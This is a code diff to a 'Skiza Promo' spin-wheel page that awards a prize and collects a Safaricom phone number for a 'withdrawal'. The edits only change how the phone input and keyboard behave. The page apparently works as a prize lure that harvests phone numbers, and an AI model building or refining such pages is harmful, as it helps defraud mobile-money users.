@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Skiza Promo - Spin Wheel</title>
     <style>
         * {
@@ -266,6 +266,18 @@
             font-size: 16px;
             transition: border-color 0.3s;
             background-color: #f9f9ff;
+            /* Hide keyboard initially - will open only when clicked */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        .phone-input input:focus {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
         }
         
         .phone-icon {
@@ -275,6 +287,7 @@
             transform: translateY(-50%);
             font-size: 18px;
             color: #6a11cb;
+            pointer-events: none;
         }
         
         .request-withdrawal-btn {
@@ -504,6 +517,31 @@
             margin-bottom: 5px;
             color: #6a11cb;
         }
+        
+        /* Additional styles to prevent keyboard from opening automatically */
+        input[type="tel"] {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+        
+        /* Ensure keyboard only opens on click/tap */
+        .phone-input input {
+            caret-color: transparent; /* Hide cursor initially */
+        }
+        
+        .phone-input input:focus {
+            caret-color: auto; /* Show cursor when focused */
+        }
+        
+        /* Prevent any automatic focus on page load */
+        .congratulations-popup:not([style*="display: flex"]) input {
+            visibility: hidden;
+        }
+        
+        .congratulations-popup[style*="display: flex"] input {
+            visibility: visible;
+        }
     </style>
 </head>
 <body>
@@ -545,7 +583,7 @@
                     <label for="phoneNumber">Phone Number</label>
                     <div class="phone-input">
                         <div class="phone-icon">📱</div>
-                        <input type="tel" id="phoneNumber" placeholder="0712345678 or 712345678" maxlength="10" required>
+                        <input type="tel" id="phoneNumber" placeholder="Tap to enter phone number" maxlength="10" required readonly onfocus="this.removeAttribute('readonly')">
                     </div>
                     <small style="color: #666; display: block; margin-top: 5px;">Enter your Safaricom number (starting with 07 or 0)</small>
                 </div>
@@ -794,14 +832,25 @@
                 withdrawAmount.textContent = `Ksh.${currentPrize.toLocaleString()}`;
                 congratulationsPopup.style.display = 'flex';
                 
-                // Reset form
+                // Reset form - keep input readonly so keyboard doesn't open automatically
                 phoneNumberInput.value = '';
+                phoneNumberInput.setAttribute('readonly', 'readonly');
                 withdrawalForm.style.display = 'block';
-                phoneNumberInput.focus();
                 
                 // Create confetti effect
                 createConfetti();
             }, 4000);
+        });
+        
+        // Remove readonly when input is clicked/tapped (keyboard will open)
+        phoneNumberInput.addEventListener('click', function() {
+            this.removeAttribute('readonly');
+            this.focus();
+        });
+        
+        phoneNumberInput.addEventListener('touchstart', function() {
+            this.removeAttribute('readonly');
+            this.focus();
         });
         
         // Request withdrawal button - now redirects directly to withdraw.html
@@ -810,6 +859,7 @@
             
             if (!validatePhoneNumber(phone)) {
                 alert('Please enter a valid Safaricom phone number\n\nExamples:\n• 0712345678 (10 digits starting with 0)\n• 712345678 (9 digits starting with 7)');
+                phoneNumberInput.removeAttribute('readonly');
                 phoneNumberInput.focus();
                 return;
             }
